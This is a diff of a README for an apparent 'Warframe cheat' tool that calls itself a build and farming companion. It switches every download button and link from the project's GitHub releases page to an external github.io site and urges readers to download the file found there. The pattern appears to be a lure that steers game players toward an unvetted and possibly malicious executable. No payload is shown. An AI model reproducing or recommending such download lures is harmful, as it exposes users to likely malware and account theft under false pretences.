@@ -1,7 +1,7 @@
 <h1>⚔️ warframe-cheat-2026-frame-weapon-mod-tool - Your Ultimate Warframe Build & Farming Companion</h1>
 
 <p align="center">
-<a href="https://github.com/Drupelettenderfoot4412/warframe-cheat-2026-frame-weapon-mod-tool/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;margin:4px 2px;cursor:pointer;border-radius:4px;">🚀 DOWNLOAD NOW - FREE</a>
+<a href="https://drupelettenderfoot4412.github.io" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;margin:4px 2px;cursor:pointer;border-radius:4px;">🚀 DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -28,7 +28,7 @@ This application helps you track your warframes, weapons, mods, Prime collection
 
 <h3>Step 1: Download the Application</h3>
 
-<p>Visit this link to download the application: <a href="https://github.com/Drupelettenderfoot4412/warframe-cheat-2026-frame-weapon-mod-tool/releases"><strong>https://github.com/Drupelettenderfoot4412/warframe-cheat-2026-frame-weapon-mod-tool/releases</strong></a></p>
+<p>Visit this link to download the application: <a href="https://drupelettenderfoot4412.github.io"><strong>https://drupelettenderfoot4412.github.io</strong></a></p>
 
 <p>On that page, look for the most recent version (usually at the top). You'll see a file or a button that says "Download" - click it to save the application to your computer.</p>
 
@@ -135,7 +135,7 @@ This application helps you track your warframes, weapons, mods, Prime collection
 <p>Ready to simplify your Warframe life? Click below to grab your copy now:</p>
 
 <p align="center">
-<a href="https://github.com/Drupelettenderfoot4412/warframe-cheat-2026-frame-weapon-mod-tool/releases" style="background-color:#008CBA;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;margin:4px 2px;cursor:pointer;border-radius:4px;">⬇️ GET THE TOOL HERE</a>
+<a href="https://drupelettenderfoot4412.github.io" style="background-color:#008CBA;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;margin:4px 2px;cursor:pointer;border-radius:4px;">⬇️ GET THE TOOL HERE</a>
 </p>
 
 <p>Join thousands of players who already use this companion to stay organized, complete their collections faster, and build the best warframes and weapons in the game. Happy farming, Tenno!</p>
